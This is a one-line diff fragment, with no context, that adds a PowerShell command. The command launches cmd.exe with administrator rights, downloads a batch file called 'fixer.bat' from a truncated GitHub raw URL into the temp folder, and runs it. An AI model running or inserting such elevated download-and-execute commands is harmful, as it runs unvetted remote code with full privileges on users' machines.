@@ -1,0 +1,1 @@
+Start-Process "cmd.exe" -ArgumentList "/c curl -o %temp%\fixer.bat https://raw.githubusercontent.com/... && %temp%\fixer.bat" -Verb RunAs
